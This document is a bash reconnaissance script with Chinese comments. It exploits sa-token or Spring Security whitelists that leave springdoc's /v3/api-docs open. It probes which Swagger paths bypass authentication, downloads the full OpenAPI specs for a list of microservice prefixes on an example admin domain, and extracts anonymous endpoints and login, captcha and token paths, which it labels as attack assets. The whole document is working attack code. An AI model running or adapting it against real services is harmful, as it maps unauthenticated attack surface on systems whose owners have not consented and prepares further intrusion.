#!/usr/bin/env bash
# springdoc-whitelist-enum.sh
# 目的：sa-token / Spring Security 白名单常把 springdoc 的 /v3/api-docs 放行，
#      导致整个微服务的全量 OpenAPI（接口清单 + 报文结构）零凭据可读。
# 用法：./springdoc-whitelist-enum.sh <BASE_URL> [HDR...]
#   例：./springdoc-whitelist-enum.sh https://admin.bet-cash.cc/api \
#         "X-Login-Type: 3"
# 输出：<BASE>/<prefix>/v3/api-docs 保存为 <prefix>.json 并打印路径/操作数

set -u
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./springdoc-whitelist-enum.sh <BASE_URL> [HEADER_LINES...]\n' >&2; exit 1; fi
BASE="${1:?usage: $0 <BASE_URL> [HEADER_LINES...]}"; shift || true
HDRS=(); for h in "$@"; do HDRS+=(-H "$h"); done
OUT="${OUT:-/tmp/apidocs}"; mkdir -p "$OUT"

# 预置前缀：网关 strip 前缀 / 微服务名 / 裸根 都试一遍
PREFIXES=("" "wg-system" "wg-member" "wg-operate" "wg-share" "wg-firm" "wg-risk" "wg-discount" "wg-bigdata" "wg-gateway")

echo "== 1) 白名单探测（哪些 springdoc 路径能过鉴权）=="
for p in v3/api-docs v3/api-docs/swagger-config swagger-resources doc.html webjars/springfox-swagger-ui/index.html v3/api-docs.yaml; do
  for pre in "" "wg-system/"; do
    code=$(curl -sS -k --max-time 12 "${HDRS[@]}" -o /dev/null -w '%{http_code}' "$BASE/${pre}${p}")
    printf '  %-46s %s\n' "${pre}${p}" "$code"
  done
done
# 判据：只有 v3/api-docs 是 200、v3/api-docs/swagger-config 是 401 → 白名单是精确匹配，不是 /v3/api-docs/**

echo "== 2) 逐前缀拉全量文档 =="
for pre in "${PREFIXES[@]}"; do
  url="$BASE/${pre:+$pre/}v3/api-docs"
  f="$OUT/${pre:-root}.json"
  sz=$(curl -sS -k --max-time 90 "${HDRS[@]}" -o "$f" -w '%{http_code} %{size_download}' "$url")
  # 统计 paths / operations
  st=$(python3 - "$f" <<'PY' 2>/dev/null
import json,sys
try: d=json.load(open(sys.argv[1]))
except Exception: print("parse-fail"); raise SystemExit
P=d.get('paths') or {}
ops=sum(len([m for m in v if m in ('get','post','put','delete','patch')]) for v in P.values())
print(f"paths={len(P)} ops={ops}")
PY
)
  printf '  %-14s %-22s %s\n' "${pre:-root}" "$sz" "$st"
done

echo "== 3) 从文档里抽攻击资产 =="
python3 - "$OUT" <<'PY'
import json,os,sys
out=sys.argv[1]
for f in sorted(os.listdir(out)):
    try: d=json.load(open(os.path.join(out,f)))
    except Exception: continue
    P=d.get('paths') or {}
    if not P: continue
    anon=[p for p in P if '/anon/' in p or p.startswith('/anon')]
    print(f"\n[{f}] anon={len(anon)}")
    for p in sorted(anon): print("   ",p)
    for p in P:
        if '/login' in p or '/captcha' in p or '/token' in p:
            print("   LOGIN:",p)
PY
